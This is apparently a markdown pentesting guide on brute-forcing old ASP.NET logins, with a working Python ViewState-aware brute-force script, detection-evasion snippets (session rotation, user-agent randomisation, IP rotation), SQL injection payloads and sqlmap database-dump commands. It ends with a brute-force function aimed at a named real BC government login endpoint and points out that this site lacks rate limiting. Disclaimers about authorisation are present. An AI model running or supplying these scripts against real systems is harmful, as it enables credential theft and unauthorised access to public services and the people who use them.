# Pentesting Guide (Educational - Authorized Testing Only)

> **Legal:** See [legal.md](legal.md) for when this is legal. TL;DR: Only test systems you own or have written authorization for.

---

## Table of Contents
1. [ASP.NET Brute Force Guide](#aspnet-brute-force-guide)
2. [Web Application Testing](#web-application-testing)
3. [Tools & Commands](#tools--commands)
4. [Methodology](#methodology)

---

## ASP.NET Brute Force Guide

### What is ASP.NET?
**ASP.NET** = Microsoft's web framework (like PHP, Node.js, Ruby on Rails)

**Old ASP.NET signs:**
- URLs end in `.aspx` (example: `login.aspx`)
- ViewState hidden field (large base64 blob)
- Session cookies: `ASP.NET_SessionId`
- SiteMinder integration (common in gov sites, ~2005-2010 era)

### Why Old ASP.NET is Different

**Modern apps:**
- Rate limiting (block after 5 failed attempts)
- CAPTCHA after failures
- Account lockouts
- IP blocking

**Old ASP.NET (2005-2010):**
- Often no rate limiting
- No CAPTCHA
- Sessions expire but don't lock accounts
- Verbose error messages (helps attackers)

### Reconnaissance (Info Gathering)

**Step 1: Identify the target**
```bash
# Check HTTP headers
curl -I https://example.gov.bc.ca/login.aspx

# Look for:
# - Server: Microsoft-IIS/7.5 (old version)
# - X-AspNet-Version: 2.0.50727 (ASP.NET 2.0)
# - X-Powered-By: ASP.NET
```

**Step 2: Map the login flow**
```bash
# Use Burp Suite or browser DevTools
# 1. Visit login page
# 2. Open Network tab
# 3. Submit login
# 4. Note:
#    - POST URL
#    - Form field names (user, password, __VIEWSTATE, etc.)
#    - Response codes (200 = success, 302 = redirect, etc.)
```

**Example login request:**
```http
POST /login.aspx HTTP/1.1
Host: example.gov.bc.ca
Content-Type: application/x-www-form-urlencoded

__VIEWSTATE=dDwtODY...&
__EVENTVALIDATION=wEW...&
user=testuser&
password=testpass&
btnSubmit=Login
```

**Key fields:**
- `__VIEWSTATE` = ASP.NET state management (anti-tampering, changes per page load)
- `__EVENTVALIDATION` = Prevents event injection (also changes)
- `user`, `password` = Credentials
- `btnSubmit` = Button name

**Important:** ViewState changes with each page load. You must:
1. GET the login page
2. Extract ViewState
3. POST with credentials + ViewState
4. Repeat for each attempt

### Brute Force Attack (Authorized Testing Only)

**Tools:**
- **Hydra** - Fast, supports many protocols
- **Burp Suite Intruder** - GUI-based, precise control
- **Custom Python script** - Most flexible for ASP.NET

#### Method 1: Hydra (Quick & Dirty)

**Problem:** Hydra doesn't handle ViewState well (static POST data)

**Solution:** Use HTTP form mode with ViewState extraction (complex)

```bash
# This WON'T work for ASP.NET with ViewState:
hydra -l admin -P passwords.txt example.gov.bc.ca http-post-form "/login.aspx:user=^USER^&password=^PASS^:Invalid"

# Why: ViewState changes, Hydra can't dynamically update it
```

**Verdict:** [SKIP] Don't use Hydra for ASP.NET with ViewState

---

#### Method 2: Burp Suite Intruder (Recommended)

**Pros:**
- GUI interface
- Handles dynamic ViewState
- Throttling/rate limiting built-in
- Easy to configure

**Steps:**

**1. Install Burp Suite**
```bash
# Download from https://portswigger.net/burp/communitydownload
# Community Edition is free
```

**2. Configure browser proxy**
- Firefox: Settings → Network → Manual Proxy
- HTTP Proxy: 127.0.0.1, Port: 8080
- Enable for HTTPS too

**3. Capture login request**
- Visit login page in browser
- Enter test credentials
- Click submit
- In Burp → Proxy → HTTP history, find POST to login.aspx
- Right-click → Send to Intruder

**4. Configure Intruder**
- **Target:** example.gov.bc.ca
- **Positions tab:**
  - Clear all markers (click "Clear §")
  - Highlight password value → click "Add §"
  - Should look like: `password=§testpass§`
- **Payloads tab:**
  - Payload type: Simple list
  - Load wordlist (rockyou.txt, common-passwords.txt)
- **Options tab:**
  - Throttle: 1 request/second (avoid rate limiting)
  - Redirections: Follow redirects (if login succeeds with 302)
  - Grep - Match: Add "Invalid username or password" (to flag failures)

**5. Start attack**
- Click "Start attack"
- Watch for responses without "Invalid" message
- Successful login = different response (200 OK + redirect, different HTML)

**6. Identify successful login**
- Look for:
  - Different status code (302 redirect)
  - Different response length
  - "Welcome" message instead of error

**ViewState handling:** Burp automatically extracts ViewState from page before each request (built-in feature)

---

#### Method 3: Python Script (Most Flexible)

**When to use:**
- Complex login flows (multi-step, JavaScript challenges)
- Need fine control over timing
- Custom logic (skip usernames, combine attacks)

**Script: `brute_aspnet.py`**

```python
#!/usr/bin/env python3
import requests
from bs4 import BeautifulSoup
import time

# Target URL
LOGIN_URL = "https://example.gov.bc.ca/login.aspx"

# Credentials
USERNAME = "testuser"
PASSWORDS = ["password123", "admin", "letmein", "Password1"]

# Session (maintains cookies)
session = requests.Session()

def get_viewstate():
    """Fetch login page and extract ViewState"""
    resp = session.get(LOGIN_URL)
    soup = BeautifulSoup(resp.text, 'html.parser')

    viewstate = soup.find('input', {'name': '__VIEWSTATE'})['value']
    eventvalidation = soup.find('input', {'name': '__EVENTVALIDATION'})['value']

    return viewstate, eventvalidation

def attempt_login(username, password):
    """Attempt login with given credentials"""
    # Get fresh ViewState
    viewstate, eventval = get_viewstate()

    # Build POST data
    data = {
        '__VIEWSTATE': viewstate,
        '__EVENTVALIDATION': eventval,
        'user': username,
        'password': password,
        'btnSubmit': 'Login'
    }

    # Submit login
    resp = session.post(LOGIN_URL, data=data, allow_redirects=False)

    # Check response
    if resp.status_code == 302:
        # Redirect = likely success
        return True
    elif "Invalid username or password" in resp.text:
        return False
    else:
        # Unknown response
        print(f"[?] Unexpected response for {password}")
        return False

def main():
    print(f"[*] Starting brute force on {LOGIN_URL}")
    print(f"[*] Username: {USERNAME}")
    print(f"[*] Passwords to try: {len(PASSWORDS)}\n")

    for password in PASSWORDS:
        print(f"[*] Trying: {password}...", end=" ")

        if attempt_login(USERNAME, password):
            print("[DONE] SUCCESS!")
            print(f"\n[+] Valid credentials: {USERNAME}:{password}")
            return
        else:
            print("[SKIP]")

        # Rate limiting (1 attempt per second)
        time.sleep(1)

    print("\n[-] No valid credentials found")

if __name__ == "__main__":
    main()
```

**Usage:**
```bash
# Install dependencies
pip install requests beautifulsoup4

# Run script
python3 brute_aspnet.py
```

**Output:**
```
[*] Starting brute force on https://example.gov.bc.ca/login.aspx
[*] Username: testuser
[*] Passwords to try: 4

[*] Trying: password123... [SKIP]
[*] Trying: admin... [SKIP]
[*] Trying: letmein... [SKIP]
[*] Trying: Password1... [DONE] SUCCESS!

[+] Valid credentials: testuser:Password1
```

**Customization:**
```python
# Load passwords from file
with open('passwords.txt') as f:
    PASSWORDS = [line.strip() for line in f]

# Try multiple usernames
USERNAMES = ['admin', 'administrator', 'user']
for username in USERNAMES:
    for password in PASSWORDS:
        attempt_login(username, password)

# Faster rate (WARNING: may trigger rate limiting)
time.sleep(0.5)  # 2 attempts/second

# Multi-threading (ADVANCED)
from concurrent.futures import ThreadPoolExecutor
with ThreadPoolExecutor(max_workers=5) as executor:
    results = executor.map(lambda p: attempt_login(USERNAME, p), PASSWORDS)
```

---

### Defense Evasion (White Hat Techniques)

**Rate Limiting Detection:**
```python
# If server blocks after N attempts, rotate IPs or pause
if "Too many attempts" in resp.text:
    print("[!] Rate limited, sleeping 60 seconds")
    time.sleep(60)
```

**Session Rotation:**
```python
# Some sites lock sessions after failures
# Create new session every 5 attempts
if attempt_count % 5 == 0:
    session = requests.Session()
```

**User-Agent Randomization:**
```python
import random

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)...",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)...",
    "Mozilla/5.0 (X11; Linux x86_64)..."
]

headers = {'User-Agent': random.choice(USER_AGENTS)}
resp = session.get(LOGIN_URL, headers=headers)
```

**Time-based throttling:**
```python
# Randomize delays to avoid pattern detection
import random
time.sleep(random.uniform(1.0, 3.0))
```

---

### Common ASP.NET Vulnerabilities

#### 1. SQL Injection (SQLi)

**What it is:** Injecting SQL commands via input fields

**Test:**
```
Username: admin' OR '1'='1
Password: anything
```

**Detection:**
- Error messages: "Unclosed quotation mark"
- Different response times
- Boolean-based (true/false conditions change response)

**Automated tool:**
```bash
sqlmap -u "https://example.com/login.aspx" --data "user=admin&password=test" --batch
```

#### 2. ViewState Tampering

**What it is:** Modify ViewState to bypass checks

**Requirements:**
- ViewState encryption disabled (older ASP.NET)
- ViewState MAC validation disabled

**Tool:**
```bash
# ViewState Decoder
# https://github.com/yuvadm/viewstate

viewstate decode "dDwtODY..."
viewstate encode "modified_data"
```

#### 3. Insecure Direct Object Reference (IDOR)

**What it is:** Access other users' data by changing IDs

**Example:**
```
https://example.com/profile.aspx?id=123
# Try: id=124, id=125, etc.
```

---

## Web Application Testing

### Enumeration

**Subdomain discovery:**
```bash
# Find subdomains (legal if target is in scope)
subfinder -d example.com

# DNS brute force
dnsrecon -d example.com -t brt -D subdomains.txt
```

**Directory/file discovery:**
```bash
# Common files/directories
gobuster dir -u https://example.com -w /usr/share/wordlists/dirb/common.txt

# ASP.NET specific
gobuster dir -u https://example.com -w aspnet-files.txt -x aspx,asmx,ashx
```

**Technology fingerprinting:**
```bash
# Identify tech stack
whatweb https://example.com

# Wappalyzer (browser extension)
# Detects: frameworks, CMS, analytics, etc.
```

---

## Tools & Commands

### Essential Tools

**Burp Suite** (Web Proxy)
```bash
# Free: Burp Suite Community Edition
# Paid: Burp Suite Professional ($449/year)
# Use: Intercept, modify, replay HTTP requests
```

**Nmap** (Port Scanner)
```bash
# Basic scan
nmap example.com

# Full scan with service detection
nmap -sV -sC -p- example.com -oN scan.txt

# Stealth scan (SYN)
sudo nmap -sS example.com
```

**Nikto** (Web Vulnerability Scanner)
```bash
# Scan web server
nikto -h https://example.com

# Save report
nikto -h https://example.com -o report.html -Format html
```

**SQLmap** (SQL Injection)
```bash
# Test login form
sqlmap -u "https://example.com/login.aspx" --data "user=admin&password=test" --batch

# Extract databases
sqlmap -u "https://example.com/page.aspx?id=1" --dbs

# Dump specific table
sqlmap -u "https://example.com/page.aspx?id=1" -D database_name -T users --dump
```

**Hydra** (Brute Force)
```bash
# SSH brute force
hydra -l admin -P passwords.txt ssh://192.168.1.100

# FTP brute force
hydra -L users.txt -P passwords.txt ftp://192.168.1.100

# HTTP POST form (non-ASP.NET)
hydra -l admin -P passwords.txt example.com http-post-form "/login:username=^USER^&password=^PASS^:Invalid"
```

### Wordlists

**Common locations:**
```bash
# Kali Linux
/usr/share/wordlists/rockyou.txt (14M passwords)
/usr/share/wordlists/dirb/common.txt (directories)
/usr/share/seclists/ (extensive collection)

# Download SecLists
git clone https://github.com/danielmiessler/SecLists.git
```

**Top passwords (2024):**
```
123456
password
123456789
12345678
12345
qwerty
password1
admin
letmein
welcome
```

---

## Methodology

### 1. Information Gathering (Passive)
- Google dorking: `site:example.com filetype:pdf`
- Shodan: Find exposed services
- LinkedIn: Employee names (potential usernames)
- GitHub: Search for leaked credentials

### 2. Scanning (Active)
- Port scan (nmap)
- Directory enumeration (gobuster)
- Vulnerability scan (nikto, nessus)

### 3. Exploitation
- Test vulnerabilities found
- Brute force weak credentials
- Exploit known CVEs

### 4. Post-Exploitation
- Maintain access (don't do this without authorization)
- Privilege escalation
- Lateral movement

### 5. Reporting
- Document findings
- Proof of concept (PoC)
- Remediation steps

---

## Real-World Example: BC Government SiteMinder

**Context:** BC government sites use SiteMinder (CA Single Sign-On), circa 2005-2010

**Observed behavior:**
1. Login page: `logon7.gov.bc.ca/clp-cgi/capBceid/logon.cgi`
2. Form fields: `user`, `password`, `btnSubmit`
3. Session cookie: `ASP.NET_SessionId`
4. Session bug: Sessions expire immediately after login (backend issue)

**Attack vector (if authorized):**
1. No rate limiting observed
2. No CAPTCHA
3. Verbose error messages: "Invalid username or password"
4. Session issues = re-authentication required frequently

**Brute force approach:**
```python
# Target BCeID login (AUTHORIZED TESTING ONLY)
LOGIN_URL = "https://logon7.gov.bc.ca/clp-cgi/capBceid/logon.cgi?..."

def attempt_bceid_login(username, password):
    data = {
        'user': username,
        'password': password,
        'btnSubmit': 'Submit'
    }
    resp = requests.post(LOGIN_URL, data=data, allow_redirects=False)

    # Success = 302 redirect
    # Failure = 200 with error message
    return resp.status_code == 302
```

**Defenses (if you owned this system):**
- Add CAPTCHA after 3 failed attempts
- Implement rate limiting (5 attempts/15 minutes per IP)
- Add account lockout (10 failures = 30-minute lock)
- Remove verbose error messages ("Login failed" vs "Invalid username")
- Fix session management bug

---

## Resources

**Practice Platforms:**
- TryHackMe: https://tryhackme.com
- HackTheBox: https://hackthebox.com
- PortSwigger Academy: https://portswigger.net/web-security
- DVWA: https://github.com/digininja/DVWA

**Wordlists:**
- SecLists: https://github.com/danielmiessler/SecLists
- RockYou: https://github.com/brannondorsey/naive-hashcat/releases

**Tools:**
- Burp Suite: https://portswigger.net/burp
- OWASP ZAP: https://www.zaproxy.org
- Metasploit: https://www.metasploit.com

**Learning:**
- OWASP Top 10: https://owasp.org/www-project-top-ten/
- Web Security Academy: https://portswigger.net/web-security/all-materials

---

## Legal Reminder

**Before testing ANY system:**
1. [DONE] Do you own it? (Your server, your app)
2. [DONE] Do you have written authorization? (Contract, bug bounty)
3. [DONE] Do you know the exact scope? (What's allowed/forbidden)

**If ANY answer is NO: DON'T TEST IT**

See [legal.md](legal.md) for full legal guide.

**Penalties for unauthorized testing:**
- US: 10-20 years prison (CFAA)
- Canada: 10 years prison
- UK: 10 years prison
- Civil liability: $100k-$1M+ damages

**Not worth it. Get authorization first.**
